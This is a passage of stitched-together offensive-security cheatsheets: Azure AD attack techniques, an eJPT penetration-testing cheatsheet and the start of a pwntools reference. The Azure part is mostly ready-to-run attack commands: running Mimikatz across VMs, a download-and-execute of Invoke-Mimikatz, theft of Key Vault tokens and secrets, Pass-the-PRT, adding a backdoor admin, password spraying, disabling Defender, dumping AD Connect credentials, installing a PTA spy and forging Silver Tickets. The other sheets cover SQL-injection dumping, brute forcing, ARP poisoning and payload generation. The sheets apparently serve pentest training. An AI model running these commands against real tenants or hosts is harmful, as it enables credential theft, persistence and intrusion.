PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose

# Connect via WinRM
PS C:\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
PS C:\Tools> Enter-PSSession $sess
```

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System

```powershell
# List available VMs
PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
ResourceGroupName    Name       
-----------------    ----       
TESTRESOURCES        Remote-Test

# Execute Powershell script on the VM
PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
```

Against the whole subscription using MicroBurst.ps1

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```


## KeyVault Secrets

```powershell
# keyvault access token
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER

# connect
PS> $token = 'eyJ0..'
PS> $keyvaulttoken = 'eyJ0..'
PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken

# query the vault and the secrets
PS Az> Get-AzKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## Pass The PRT

> MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Copy the Context, ClearKey and DerivedKey
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
```

```powershell
# Generate a JWT
PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
PS AADInternals> $PRT_OF_USER = '...'
PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
PS AADInternals> $ClearKey = "XXYYZZ..."
PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
eyJ0eXAiOiJKV1QiL...
```

The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf.    
Edit the Chrome cookie (F12) -> Application -> Cookies with the values:

```powershell
Name: x-ms-RefreshTokenCredential
Value: <Signed JWT>
HttpOnly: √
```

:warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.


## Pass The Certificate

```ps1
Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username –Verbose
Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert

# Require the PRT, TenantID, Context and DerivedKey
& 'C:\Program Files\Python39\python.exe' C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
# PFX saved with the name <Username>@<TENANT NAME>.onmicrosoft.com.pfx and password AzureADCert
```

Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine

https://github.com/morRubin/AzureADJoinedMachinePTC

```ps1
Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10

python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```

## Intunes Administration

Requirements:
* **Global Administrator** or **Intune Administrator** Privilege : `Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"`

1. Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT
2. Go to **Devices** -> **All Devices** to check devices enrolled to Intune
3. Go to **Scripts** and click on **Add** for Windows 10. 
4. Add a **Powershell script**
5. Specify **Add all users** and **Add all devices** in the **Assignments** page.

:warning: It will take up to one hour before you script is executed !



## Dynamic Group Membership

Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`

Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`    
Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group

1. Open user's profile, click on **Manage**
2. Click on **Resend** invite and to get an invitation URL
3. Set the secondary email
    ```powershell
    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
    ```

## Administrative Unit

> Administrative Unit can reset password of another user

```powershell
PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl 
PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
```

## Deployment Template

```powershell
PS Az> Get-AzResourceGroup
PS Az> Get-AzResourceGroupDeployment -ResourceGroupName SAP

# Export
PS Az> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
cat <DEPLOYMENT NAME>.json # search for hardcoded password
cat <PATH TO .json FILE> | Select-String password
```

## Application Proxy

```powershell
# Enumerate application that have Proxy
PS C:\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
PS C:\Tools> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
PS C:\Tools> . C:\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1
PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
```

## Conditional Access

* Bypassing conditional access by copying User-Agent (Chrome Dev Tool > Select iPad Pro, etc)
* Bypassing conditional access by faking device compliance
    ```powershell
    # AAD Internals - Making your device compliant
    # Get an access token for AAD join and save to cache
    Get-AADIntAccessTokenForAADJoin -SaveToCache
    # Join the device to Azure AD
    Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
    # Marking device compliant - option 1: Registering device to Intune
    # Get an access token for Intune MDM and save to cache (prompts for credentials)
    Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
    # Join the device to Intune
    Join-AADIntDeviceToIntune -DeviceName "SixByFour"
    # Start the call back
    Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
    ```


## Azure AD

With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.

1. Authenticate to your webmail portal (i.e. https://webmail.domain.com/)
2. Change your browser URL to: https://azure.microsoft.com/
3. Pick the account from the active sessions
4. Select Azure Active Directory and enjoy!

### Azure AD vs Active Directory

| Active Directory  | Azure AD  |
|---|---|
| LDAP  | REST API'S  |
| NTLM/Kerberos  | OAuth/SAML/OpenID |
| Structured directory (OU tree)  | Flat structure  |
| GPO  | No GPO's  |
| Super fine-tuned access controls  | Predefined roles |
| Domain/forest  | Tenant  |
| Trusts  | Guests  |

* Password Hash Syncronization (PHS)
    * Passwords from on-premise AD are sent to the cloud
    * Use replication via a service account created by AD Connect
* Pass Through Authentication (PTA)
    * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text
* Connect Windows Server AD to Azure AD using Federation Server (ADFS)
    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password


* Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large
* Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large
* Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large
* Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large

### Password Spray

> Default lockout policy of 10 failed attempts, locking out an account for 60 seconds

```powershell
git clone https://github.com/dafthack/MSOLSpray
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!

# UserList  - UserList file filled with usernames one-per-line in the format "user@domain.com"
# Password  - A single password that will be used to perform the password spray.
# OutFile   - A file to output valid results to.
# Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.
# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
```

### Convert GUID to SID

The user's AAD id is translated to SID by concatenating `"S-1–12–1-"` to the decimal representation of each section of the AAD Id.

```powershell
GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
```

For example, the representation of `6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`

## Azure AD Connect 

Check if Azure AD Connect is installed : `Get-ADSyncConnector`

* For **PHS**, we can extract the credentials
* For **PTA**, we can install the agent
* For **Federation**, we can extract the certificate from ADFS server using DA

```powershell
PS > Set-MpPreference -DisableRealtimeMonitoring $true
PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
PS > Get-AADIntSyncCredentials

# Get Token for SYNC account and reset on-prem admin password
PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
```

1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`
2. Install a PTA Backdoor
    ```powershell
    PS AADInternals> Install-AADIntPTASpy
    PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
    ```


### Azure AD Connect - Password extraction

Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf

Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
--- | --- | --- | --- | ---
ADSyncDecrypt | Yes | Yes | No | No
ADSyncGather | Yes | No | No | Yes
ADSyncQuery | No (network RPC calls only) | No | Yes | Yes


```powershell
git clone https://github.com/fox-it/adconnectdump
# DCSync with AD Sync account
```

### Azure AD Connect - MSOL Account's password and DCSync

You can perform **DCSync** attack using the MSOL account.

Requirements:
  * Compromise a server with Azure AD Connect service
  * Access to ADSyncAdmins or local Administrators groups

Use the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password for the MSOL account:
* `azuread_decrypt_msol.ps1`: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
* `azuread_decrypt_msol_v2.ps1`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c

Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.

### Azure AD Connect - Seamless Single Sign On Silver Ticket

> Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)

> Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account **AZUREADSSOC** is created in the on-prem AD.

:warning: The password of the AZUREADSSOACC account never changes.

Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure

1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
    ```powershell
    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
    ```
2. AAD logon name of the user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
4. Create the Silver Ticket and inject it into Kerberos cache:
    ```powershell
    mimikatz.exe "kerberos::golden /user:elrond
    /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
    /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
    /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
    ```
5. Launch Mozilla Firefox
6. Go to about:config and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.




# References

* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)
* [Get Access Tokens for Managed Service Identity on Azure App Service](https://zhiliaxu.github.io/app-service-managed-identity.html)
* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://o365blog.com/post/mdm/)
* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)
* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
* [An introduction to penetration testing Azure - Graceful Security](https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-azure/)
* [Running Powershell scripts on Azure VM - Netspi](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
* [Attacking Azure Cloud shell - Netspi](https://blog.netspi.com/attacking-azure-cloud-shell/)
* [Maintaining Azure Persistence via automation accounts - Netspi](https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/)
* [Detecting an attacks on active directory with Azure - Smartspate](https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/)
* [Azure AD Overview](https://www.youtube.com/watch?v=l_pnNpdxj20) 
* [Windows Azure Active Directory in plain English](https://www.youtube.com/watch?v=IcSATObaQZE)
* [Building Free Active Directory Lab in Azure - @kamran.bilgrami](https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f) 
* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
* [Azure AD connect for RedTeam - @xpnsec](https://blog.xpnsec.com/azuread-connect-for-redteam/)
* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/)
* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://www.lares.com/hunting-azure-admins-for-vertical-escalation/)
* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
* [AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)














# ejpt-cheatsheet 

## Nmap
___
#### Ping Sweep
```sh
nmap -sn <CIDR Notation>        #Finding alive IP addresses in the subnet
```
You can also perform ping sweep using fping tool
```
fping -a -g 10.54.12.0/24 2>/dev/null
```

Now you need to find open ports on each alive IP, you can perform this using two methods
#### METHOD - 1
Perform aggressive scan on all ports which might do not required to be scanned. This could cost you time and give results which might not be useful.
```sh
nmap -p- -A -Pn -iL hosts.txt       # hosts.txt file contains the alive host addresses
```
#### METHOD - 2
This method first find the open ports and after this you can perform aggressive scan on particular port. This method do not probe all the available ports blindly and you can choose which port might be useful to you to scan.

```sh
nmap -p- -T4 -Pn -vv -iL hosts.txt      # This will give you all the open ports on hosts provided using hosts.txt file

nmap -p<ports> -A -Pn -vv <IP>      # This will only probe ports selected by you for particular IP
```


## Analyzing HTTP and HTTPS
___

#### HTTP
```sh
nc -v www.abc.com 80        # After pressing enter you are prompted to send some data

Type two lines given below and press enter two times to get http response
GET / HTTP/1.1
Host: www.abc.com 
```
#### HTTPs
```sh
openssl s_client -connect hack.me 443       # Establish ssl connection
```
After establishing ssl connection you can proceed like nc prompt

## Checking Routes and Adding Manual Routes
___

#### Checking Routes
```
ip route    # Checking defined routes in linux
route       # Checking defined routes in linux
route print     # Checking defined routes in windows
```
#### Adding Manual Routes
```sh
ip route add <subnet> via <gateway or router address>
```
for example,
```sh
ip route add 192.168.222.0/24 via 10.172.24.1       # Here 10.172.24.1 is the address of the gateway for subnet 192.168.222.0/24
```


## Finding MAC Addresses
___

```
ipconfig /all       # windows
ifconfig        # *nix OSs
ip addr     # linux
```

## Checking ARP Cache
___


```
arp -a      # Windows
arp     # *nix OSs
ip neighbour        # Linux 
```
## Checking for Listening Ports on a Host
___
```
netstat -ano        # Windows
netstat -tunp       # linux
```

## SQLmap
___

#### Checking for existence of SQL injection
```sh
sqlmap -u ‘http://example.com/view.php?id=1141’ -p id       # GET Method

sqlmap -u ‘http://example.com/view.php’ --data <POST String> -p <parameter>     # POST Method
```
If vulnerable parameter found then you can proceed with extraction of data from database
```sh
sqlmap -u ‘http://example.com/view.php?id=1141’ --dbs     # Getting database names
sqlmap -u ‘http://example.com/view.php?id=1141’ -D <DB_name> --tables   # Getting table names
sqlmap -u ‘http://example.com/view.php?id=1141’ -D <db_name> -T <tbl_name> --columns    # Getting columns
sqlmap -u ‘http://example.com/view.php?id=1141’ -D <DB_name> -T <tbl_name> -C <column_name_comma_separate> --dump # To dump whole table remove column specification from the command and use only --dump option
```
## John-The-Ripper
___
```sh
john --list=formats
john -incremental -users:<users list> <file to crack>       # if you want to crack only certain users from the password database such as /etc/shadow file
john --show crackme     # Check cracked password after completion of cracking session, where crackme is the password database file
john -wordlist=<wordlist> <file to crack>
john -wordlist=<wordlist> -rules <file to crack>        # rules are used for cracking mangling words such as for cat mangling words could be c@t,caT,CAT,CaT
```
## Hydra
___

```sh
hydra -U ftp        # hydra uses module for each service to attack. To get information about a module this command can be used
hydra -L users.txt -P pass.txt <service://server> <options>
hydra -l admin -P pass.txt -f ftp://10.10.10.10        # Stop attacking on finding first successful hit for user admin
hydra  -L users.txt -P passwords.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:Incorrect credentials" -f -V    # Attacking http post form
```

## Hashcat
___

```sh
hashcat -m 0 -a 0 exam.hash file.dict
hashcat -m 0 -a 0 exam.hash file.dict -r rule/custom.rule       # here rule file contains the rules to creat mangling word such as p@ssword, PaSSworD  https://hashcat.net/wiki/doku.php?id=rule_based_attack 
hashcat -m 0 -a 3 exam.hash ?l?l?l?l?l?a        # https://hashcat.net/wiki/doku.php?id=mask_attack
```
## SMB Enumeration
___

#### enum4linux
```sh
enum4linux -a <ip>      # Enumerating using enum4linux tool
```
#### smbclient
```sh
smbclient -L //IP -N    # Checking for available shares
smbclient //<target IP>/IPC$ -N     # Connecting to a share
```
#### nmap scripts
```sh
nmap -p445 --script=smb-vuln-* <IP> -v      # This will run all the smb-vuln scripts, if you want to run only few scripts then you can check other available scripts in /usr/share/nmap/scripts
```
## Checking for anonymous FTP 
___
```sh
ftp <IP>        # enter 'anonymous' as username and password
```
## ARP Poisoning
___
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward      # enabling Linux Kernel IP Forwarding, to enable forwarding packet to real destination host
arpspoof -i <interface> -t <target> -r <host>       # if arpspoof do not work then install dsniff which includes this tool also
```
## MySQL
___

If you find mysql information then you can try connecting to mysql service remotely.
```sh
mysql -u <user> -p<password> -h <IP> -D <dbname>
```
## Directory busting
___
#### dirb
```sh
dirb http://<IP>/
dirb http://<IP>/ <dictionary_file_path>    # Use dictionary other than default one
dirb http://<IP>/dir -u admin:admin    # When you want to bust recursively but a dir asks for username password which you know already 
```
#### gobuster
```sh
gobuster dir --url http://<IP>/ --wordlist=<wordlist_file_path>     # -t <value> for more threads
gobuster dir --url http://<IP>/dir --wordlist=<wordlist_file_path> -U username -P password
```

## MsfVenom Payload Creation
___
```sh
msfvenom -p <payload_path> LHOST=<IP> LPORT=<PORT> -f <format> -o shell
```
Check [this](https://netsec.ws/?p=331) for some useful payloads

## Meterpreter Autoroute
___

```
meterpreter> run autoroute -s <subnet>
meterpreter > run autoroute -p      # show active route table
```













# Pwntools Cheatsheet

 1. [Program Interaction](#program-interaction)
 2. [Environment and Contexts](#environment-and-contexts)
 3. [Logging and Output](#logging-and-output)
 4. [Encoding, Packing and Utility](#encoding-packing-and-utility)
 5. [Assembly and Shellcraft](#assembly-and-shellcraft)
 6. [ELFs, Strings and Symbols](#elfs-strings-and-symbols)
 7. [Return Oriented Programming](#return-oriented-programming)
 8. [SROP and Sigreturn Frames](#srop-and-sigreturn-frames)
 9. [Format String Exploits](#format-string-exploits)


<a name="program-interaction"></a>
## 1. Program Interaction

```py
# process objects can be created from a local binary, or created
# from a remote socket
p = process('./target')
p = remote('127.0.0.1', 1337)
```

```py
# environment variables and command line arguments can also be passed
# to the target binary at runtime
p = process(['./target', '--arg1', 'some data'], env={'env1': 'some data'})
```

```py
# you can attach a gdb instance to your already running process
p = process('./target')
gdb.attach(p)

# you can also start the process running under gdb, disable ASLR,
# and send gdb script at startup
p = gdb.debug('./target', aslr=False, gdbscript='b *main+123')
```

```py
# writing data to the process `stdin`
p.write(b'aaaa')      # p.send(b'aaaa')
p.writeline(b'aaaa')  # p.sendline(b'aaaa'), p.write(b'aaaa' + b'\n')

# reading data from the process `stdout`
p.read(123)                 # p.recv(123)
p.readline()                # p.recvline(), p.readuntil('\n')
p.readuntil('some string')  # p.recvuntil('some string')
p.readall()                 # p.recvall()
p.clean(1)                  # like `readall` but with a timeout

# p.readuntil('some string') ; p.write(b'aaaa')
p.writeafter('some string', b'aaaa')  # p.sendafter('some string', b'aaaa')

# p.readuntil('some string') ; p.writeline(b'aaaa')
p.writelineafter('some string', b'aaaa')  # p.sendlineafter('some string', b'aaaa')

# interacting with the process manually
p.interactive()

# waiting for the process to finish
p.wait()
```

```py
# you can also use pwntools tubes in python's `with` specifier
with process('./target') as p:
    # interact with process here, when done `p.close()` is called
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="environment-and-contexts"></a>
## 2. Environment and Contexts

```py
# this list of context values is not exhaustive, these are
# just the ones that I use the most often

# target architecture (default 'i386')
# valid values are 'aarch64', 'arm', 'i386', and 'amd64'
# note that this is very important when writing assembly,
# packing integers, and when building rop chains
context.arch = 'amd64'

# endianness (default 'little')
# valid values are 'big', and 'little'
context.endian = 'big'

# log verbosity (default 'info')
# valid values are 'debug', 'info', 'warn', and 'error'
context.log_level = 'error'

# signedness (default 'unsigned')
# valid values are 'unsigned', and 'signed'
context.sign = 'signed'
```

```py
# you can also update multiple context values at once with the 
# `clear` or `update` functions
context.clear(arch='amd64', log_level='error')
context.update(arch='amd64', log_level='error')
```

```py
# pwntools also allows you to use what are called 'scoped'
# contexts, utilising python's `with` specifier
with context.local(log_level='error'):
    # do stuff
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="logging-and-output"></a>
## 3. Logging and Output

```py
# the most basic logging utilities are below
log.warn('a warning message')     # -> [!] a warning message
log.info('some information')      # -> [*] some information
log.debug('a debugging message')  # -> [DEBUG] a debugging message
```

```py
# logging errors will trigger an exception in addition
# to printing some output
log.error('an error occurred')

'''
[ERROR] an error occurred
---------------------------------------------------------------------------
PwnlibException                           Traceback (most recent call last)
<ipython-input-10-5fe862ad5f5b> in <module>
----> 1 log.error('an error occurred')

/usr/local/lib/python3.9/dist-packages/pwnlib/log.py in error(self, message, *args, **kwargs)
    422         """
    423         self._log(logging.ERROR, message, args, kwargs, 'error')
--> 424         raise PwnlibException(message % args)
    425 
    426     def exception(self, message, *args, **kwargs):

PwnlibException: an error occurred
'''
```

```py
# debug messages work a little differently than the
# other log levels, by default they're disabled
context.log_level = 'debug'

# they will also trigger on a lot of normal functions
# if the log level is set to debug
asm('nop')

'''
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.9/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    nop
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-gl2k0o4t/step2 /tmp/pwn-asm-gl2k0o4t/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-gl2k0o4t/step3 /tmp/pwn-asm-gl2k0o4t/step4
'''
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="encoding-packing-and-utility"></a>
## 4. Encoding, Packing and Utility

```py
# pwntools provides functions for converting to / from
# hexadecimal representations of byte strings
enhex(b'/flag')      # = '2f666c6167'
unhex('2f666c6167')  # = b'/flag'

# pwntools provides functions for converting to / from
# base64 representations of byte strings
b64e(b'/flag')    # = 'L2ZsYWc='
b64d('L2ZsYWc=')  # = b'/flag'
```

```py
# you can also find functions for calculating md5 and sha1
# hashes within the pwntools library
md5sumhex(b'hello')         # = '5d41402abc4b2a76b9719d911017c592'
md5filehex('./some-file')   # = '2b00042f7481c7b056c4b410d28f33cf'
sha1sumhex(b'hello')        # = 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'
sha1filehex('./some-file')  # = '7d97e98f8af710c7e7fe703abc8f639e0ee507c4'
```

```py
# converting from integer representations
p8(0x41)                 # = b'\x41'
p16(0x4142)              # = b'\x42\x41'
p32(0x41424344)          # = b'\x44\x43\x42\x41'
p64(0x4142434445464748)  # = b'\x48\x47\x46\x45\x44\x43\x42\x41'

# converting to integer representations
u8(b'\x41')                               # = 0x41
u16(b'\x42\x41')                          # = 0x4142
u32(b'\x44\x43\x42\x41')                  # = 0x41424344
u64(b'\x48\x47\x46\x45\x44\x43\x42\x41')  # = 0x4142434445464748
```

```py
# you can also specify endianness with the (un)packing functions
p64(0x4142434445464748, endian='big')                   # = b'\x41\x42\x43\x44\x45\x46\x47\x48
u64(b'\x41\x42\x43\x44\x45\x46\x47\x48', endian='big')  # = 0x4142434445464748
```

```py
# pwntools also provides a `pack` and `unpack` functions for data of
# atypical or unusual length
pack(0x414243, 24)           # = b'\x43\x42\x41'
unpack(b'\x41\x42\x43', 24)  # = 0x434241
```

```py
# a leak we've captured from the process `stdout`
leak = b'0\xe1u65\x7f'

# we can use pwntools' `unpack` function to convert it to
# an integer representation
leak = unpack(leak, 'all')  # leak = 139866523689264 = 0x7f353675e130
```

```py
# pwntools also provides functions for generating cyclic sequences
# of bytes to find various offsets in memory
cyclic(16)       # = b'aaaabaaacaaadaaa'
